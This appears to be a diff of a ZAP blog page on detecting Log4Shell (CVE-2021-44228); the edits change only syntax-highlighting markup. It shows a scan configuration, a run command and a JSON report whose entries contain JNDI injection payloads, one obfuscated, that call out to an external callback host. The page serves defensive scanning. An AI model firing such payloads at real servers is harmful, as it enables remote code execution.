@@ -38,7 +38,7 @@
   
   
   
-    <link href="/main.d52679.css" rel="stylesheet">
+    <link href="/main.b867e9.css" rel="stylesheet">
   
 </head>
 <body>
@@ -249,99 +249,99 @@ replacer.full_list(0).regex=false
 replacer.full_list(0).replacement=test
 replacer.full_list(0).initiators=\[3\]
 </code></pre><p><strong>log4shell.yaml</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">---
-<span style="color:#f92672">env</span>:
-  <span style="color:#f92672">contexts</span>:
-  - <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;Default Context&#34;</span>
-    <span style="color:#f92672">urls</span>:
-    - <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>
-  <span style="color:#f92672">parameters</span>:
-    <span style="color:#f92672">failOnError</span>: <span style="color:#66d9ef">true</span>
-    <span style="color:#f92672">failOnWarning</span>: <span style="color:#66d9ef">false</span>
-    <span style="color:#f92672">progressToStdout</span>: <span style="color:#66d9ef">true</span>
-  <span style="color:#f92672">vars</span>: {}
-<span style="color:#f92672">jobs</span>:
-- <span style="color:#f92672">parameters</span>: {}
-  <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;spider&#34;</span>
-  <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;spider&#34;</span>
-- <span style="color:#f92672">parameters</span>: {}
-  <span style="color:#f92672">policyDefinition</span>:
-    <span style="color:#f92672">defaultStrength</span>: <span style="color:#e6db74">&#34;medium&#34;</span>
-    <span style="color:#f92672">defaultThreshold</span>: <span style="color:#e6db74">&#34;off&#34;</span>
-    <span style="color:#f92672">rules</span>:
-    - <span style="color:#f92672">id</span>: <span style="color:#ae81ff">40043</span>
-      <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;Log4Shell (CVE-2021-44228)&#34;</span>
-      <span style="color:#f92672">threshold</span>: <span style="color:#e6db74">&#34;medium&#34;</span>
-      <span style="color:#f92672">strength</span>: <span style="color:#e6db74">&#34;default&#34;</span>
-  <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;activeScan&#34;</span>
-  <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;activeScan&#34;</span>
-- <span style="color:#f92672">parameters</span>:
-    <span style="color:#f92672">time</span>: <span style="color:#e6db74">&#34;0:30&#34;</span>
-  <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;delay&#34;</span>
-  <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;delay&#34;</span>
-- <span style="color:#f92672">type</span>: <span style="color:#ae81ff">report</span>
-  <span style="color:#f92672">parameters</span>:
-    <span style="color:#f92672">template</span>: <span style="color:#ae81ff">traditional-json</span>
-    <span style="color:#f92672">reportFile</span>: <span style="color:#ae81ff">log4shell-report</span>
-</code></pre></div><p>Run ZAP against the demo app with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">env</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">contexts</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;Default Context&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">urls</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">parameters</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">failOnError</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">failOnWarning</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">progressToStdout</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">vars</span>: {}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">jobs</span>:
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">parameters</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;spider&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;spider&#34;</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">parameters</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">policyDefinition</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">defaultStrength</span>: <span style="color:#e6db74">&#34;medium&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">defaultThreshold</span>: <span style="color:#e6db74">&#34;off&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">rules</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">id</span>: <span style="color:#ae81ff">40043</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;Log4Shell (CVE-2021-44228)&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">threshold</span>: <span style="color:#e6db74">&#34;medium&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">strength</span>: <span style="color:#e6db74">&#34;default&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;activeScan&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;activeScan&#34;</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">parameters</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">time</span>: <span style="color:#e6db74">&#34;0:30&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#e6db74">&#34;delay&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;delay&#34;</span>
+</span></span><span style="display:flex;"><span>- <span style="color:#f92672">type</span>: <span style="color:#ae81ff">report</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">parameters</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">template</span>: <span style="color:#ae81ff">traditional-json</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">reportFile</span>: <span style="color:#ae81ff">log4shell-report</span>
+</span></span></code></pre></div><p>Run ZAP against the demo app with:</p>
 <pre tabindex="0"><code>./zap.sh -cmd -dir log4shell -configfile /path/to/log4shell.conf -autorun /path/to/log4shell.yaml
 </code></pre><p>Replace <code>/path/to/…</code> with the full path of the files.</p>
 <p>The generated report should show the vulnerability 😄.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-	<span style="color:#f92672">&#34;@version&#34;</span>: <span style="color:#e6db74">&#34;2.11.1&#34;</span>,
-	<span style="color:#f92672">&#34;@generated&#34;</span>: <span style="color:#e6db74">&#34;Mon, 13 Dec 2021 15:53:57&#34;</span>,
-	<span style="color:#f92672">&#34;site&#34;</span>:[ 
-		{
-			<span style="color:#f92672">&#34;@name&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000&#34;</span>,
-			<span style="color:#f92672">&#34;@host&#34;</span>: <span style="color:#e6db74">&#34;localhost&#34;</span>,
-			<span style="color:#f92672">&#34;@port&#34;</span>: <span style="color:#e6db74">&#34;8000&#34;</span>,
-			<span style="color:#f92672">&#34;@ssl&#34;</span>: <span style="color:#e6db74">&#34;false&#34;</span>,
-			<span style="color:#f92672">&#34;alerts&#34;</span>: [ 
-				{
-					<span style="color:#f92672">&#34;pluginid&#34;</span>: <span style="color:#e6db74">&#34;40043&#34;</span>,
-					<span style="color:#f92672">&#34;alertRef&#34;</span>: <span style="color:#e6db74">&#34;40043&#34;</span>,
-					<span style="color:#f92672">&#34;alert&#34;</span>: <span style="color:#e6db74">&#34;Log4Shell (CVE-2021-44228)&#34;</span>,
-					<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Log4Shell (CVE-2021-44228)&#34;</span>,
-					<span style="color:#f92672">&#34;riskcode&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
-					<span style="color:#f92672">&#34;confidence&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>,
-					<span style="color:#f92672">&#34;riskdesc&#34;</span>: <span style="color:#e6db74">&#34;High (Medium)&#34;</span>,
-					<span style="color:#f92672">&#34;desc&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.&lt;/p&gt;&#34;</span>,
-					<span style="color:#f92672">&#34;instances&#34;</span>:[ 
-						{
-							<span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>,
-							<span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>,
-							<span style="color:#f92672">&#34;param&#34;</span>: <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>,
-							<span style="color:#f92672">&#34;attack&#34;</span>: <span style="color:#e6db74">&#34;${jndi:dns://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu/abc}&#34;</span>,
-							<span style="color:#f92672">&#34;evidence&#34;</span>: <span style="color:#e6db74">&#34;DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1&#34;</span>
-						},
-						{
-							<span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>,
-							<span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>,
-							<span style="color:#f92672">&#34;param&#34;</span>: <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>,
-							<span style="color:#f92672">&#34;attack&#34;</span>: <span style="color:#e6db74">&#34;${jndi:${lower:l}${lower:d}a${lower:p}://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu/abc}&#34;</span>,
-							<span style="color:#f92672">&#34;evidence&#34;</span>: <span style="color:#e6db74">&#34;DNS_A http://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu. HTTP/1.1&#34;</span>
-						},
-						{
-							<span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>,
-							<span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>,
-							<span style="color:#f92672">&#34;param&#34;</span>: <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>,
-							<span style="color:#f92672">&#34;attack&#34;</span>: <span style="color:#e6db74">&#34;${jndi:ldap://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu/abc}&#34;</span>,
-							<span style="color:#f92672">&#34;evidence&#34;</span>: <span style="color:#e6db74">&#34;DNS_A http://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu. HTTP/1.1&#34;</span>
-						}
-					],
-					<span style="color:#f92672">&#34;count&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
-					<span style="color:#f92672">&#34;solution&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;Upgrade Log4j2 to version 2.15.0 or newer. In previous releases (&gt;2.10) this behavior can be mitigated by setting system property \&#34;log4j2.formatMsgNoLookups\&#34; to \&#34;true\&#34; or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \&#34;com.sun.jndi.rmi.object.trustURLCodebase\&#34; and \&#34;com.sun.jndi.cosnaming.object.trustURLCodebase\&#34; to \&#34;false\&#34;.&lt;/p&gt;&#34;</span>,
-					<span style="color:#f92672">&#34;otherinfo&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Request&lt;/p&gt;&lt;p&gt;DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; opcode: QUERY, status: NOERROR, id: 38751&lt;/p&gt;&lt;p&gt;;; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; QUESTION SECTION:&lt;/p&gt;&lt;p&gt;;7fiivcu3eqx4dozvlnwkofl3te.odiss.eu.\tIN\t A&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; ADDITIONAL SECTION:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; OPT PSEUDOSECTION:&lt;/p&gt;&lt;p&gt;; EDNS: version 0; flags: ; udp: 1400&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Response&lt;/p&gt;&lt;p&gt;HTTP/1.0 0&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&#34;</span>,
-					<span style="color:#f92672">&#34;reference&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;https://www.cve.org/CVERecord?id=CVE-2021-44228&lt;/p&gt;&lt;p&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/p&gt;&lt;p&gt;https://nvd.nist.gov/vuln/detail/CVE-2021-44228&lt;/p&gt;&#34;</span>,
-					<span style="color:#f92672">&#34;cweid&#34;</span>: <span style="color:#e6db74">&#34;117&#34;</span>,
-					<span style="color:#f92672">&#34;wascid&#34;</span>: <span style="color:#e6db74">&#34;20&#34;</span>,
-					<span style="color:#f92672">&#34;sourceid&#34;</span>: <span style="color:#e6db74">&#34;102&#34;</span>
-				}
-			]
-		}
-	]
-}
-</code></pre></div><h2 id="authentication">Authentication</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;@version&#34;</span>: <span style="color:#e6db74">&#34;2.11.1&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;@generated&#34;</span>: <span style="color:#e6db74">&#34;Mon, 13 Dec 2021 15:53:57&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;site&#34;</span>:[ 
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&#34;@name&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&#34;@host&#34;</span>: <span style="color:#e6db74">&#34;localhost&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&#34;@port&#34;</span>: <span style="color:#e6db74">&#34;8000&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&#34;@ssl&#34;</span>: <span style="color:#e6db74">&#34;false&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&#34;alerts&#34;</span>: [ 
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;pluginid&#34;</span>: <span style="color:#e6db74">&#34;40043&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;alertRef&#34;</span>: <span style="color:#e6db74">&#34;40043&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;alert&#34;</span>: <span style="color:#e6db74">&#34;Log4Shell (CVE-2021-44228)&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Log4Shell (CVE-2021-44228)&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;riskcode&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;confidence&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;riskdesc&#34;</span>: <span style="color:#e6db74">&#34;High (Medium)&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;desc&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.&lt;/p&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;instances&#34;</span>:[ 
+</span></span><span style="display:flex;"><span>						{
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;param&#34;</span>: <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;attack&#34;</span>: <span style="color:#e6db74">&#34;${jndi:dns://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu/abc}&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;evidence&#34;</span>: <span style="color:#e6db74">&#34;DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1&#34;</span>
+</span></span><span style="display:flex;"><span>						},
+</span></span><span style="display:flex;"><span>						{
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;param&#34;</span>: <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;attack&#34;</span>: <span style="color:#e6db74">&#34;${jndi:${lower:l}${lower:d}a${lower:p}://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu/abc}&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;evidence&#34;</span>: <span style="color:#e6db74">&#34;DNS_A http://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu. HTTP/1.1&#34;</span>
+</span></span><span style="display:flex;"><span>						},
+</span></span><span style="display:flex;"><span>						{
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;uri&#34;</span>: <span style="color:#e6db74">&#34;http://localhost:8000/&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;method&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;param&#34;</span>: <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;attack&#34;</span>: <span style="color:#e6db74">&#34;${jndi:ldap://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu/abc}&#34;</span>,
+</span></span><span style="display:flex;"><span>							<span style="color:#f92672">&#34;evidence&#34;</span>: <span style="color:#e6db74">&#34;DNS_A http://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu. HTTP/1.1&#34;</span>
+</span></span><span style="display:flex;"><span>						}
+</span></span><span style="display:flex;"><span>					],
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;count&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;solution&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;Upgrade Log4j2 to version 2.15.0 or newer. In previous releases (&gt;2.10) this behavior can be mitigated by setting system property \&#34;log4j2.formatMsgNoLookups\&#34; to \&#34;true\&#34; or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \&#34;com.sun.jndi.rmi.object.trustURLCodebase\&#34; and \&#34;com.sun.jndi.cosnaming.object.trustURLCodebase\&#34; to \&#34;false\&#34;.&lt;/p&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;otherinfo&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Request&lt;/p&gt;&lt;p&gt;DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; opcode: QUERY, status: NOERROR, id: 38751&lt;/p&gt;&lt;p&gt;;; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; QUESTION SECTION:&lt;/p&gt;&lt;p&gt;;7fiivcu3eqx4dozvlnwkofl3te.odiss.eu.\tIN\t A&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; ADDITIONAL SECTION:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;;; OPT PSEUDOSECTION:&lt;/p&gt;&lt;p&gt;; EDNS: version 0; flags: ; udp: 1400&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;Response&lt;/p&gt;&lt;p&gt;HTTP/1.0 0&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;--------------------------------&lt;/p&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;reference&#34;</span>: <span style="color:#e6db74">&#34;&lt;p&gt;https://www.cve.org/CVERecord?id=CVE-2021-44228&lt;/p&gt;&lt;p&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/p&gt;&lt;p&gt;https://nvd.nist.gov/vuln/detail/CVE-2021-44228&lt;/p&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;cweid&#34;</span>: <span style="color:#e6db74">&#34;117&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;wascid&#34;</span>: <span style="color:#e6db74">&#34;20&#34;</span>,
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&#34;sourceid&#34;</span>: <span style="color:#e6db74">&#34;102&#34;</span>
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			]
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="authentication">Authentication</h2>
 <p>While many apps are vulnerable to Log4Shell with no authentication you should not assume that this will always be the case.</p>
 <p>If an app only uses Log4j to log data from authenticated users then you will only find the vulnerabilities by performing an authenticated scan.</p>
 <p>We always recommend running authenticated scans in a safe environment, and if you are doing that then you should check if your app can reach your chosen OAST server (e.g. <code>ping odiss.eu</code>).</p>
